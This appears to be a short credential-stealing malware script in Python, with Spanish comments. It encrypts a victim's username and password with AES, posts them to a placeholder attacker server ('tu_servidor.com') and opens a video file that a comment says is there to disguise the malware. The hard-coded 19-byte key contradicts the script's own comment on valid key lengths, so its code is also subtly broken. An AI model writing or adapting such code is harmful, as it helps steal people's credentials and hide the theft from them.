import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests
import subprocess

# Función para cifrar datos
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv, ct

# Clave de cifrado (debe ser de 16, 24 o 32 bytes)
key = b'mi_clave_secreta123'

# Datos a enviar (puedes modificar esto para capturar otros datos)
data_to_send = {
    'username': 'victim_username',
    'password': 'victim_password'
}

# Cifrar los datos
iv, encrypted_data = encrypt_data(str(data_to_send).encode(), key)

# Enviar los datos cifrados a tu servidor
url = 'http://tu_servidor.com/receive_data'
payload = {'iv': iv, 'data': encrypted_data}
requests.post(url, data=payload)

# Ejecutar el comando para abrir el video (para disfrazar el malware)
subprocess.run(['start', 'video.mp4'], shell=True)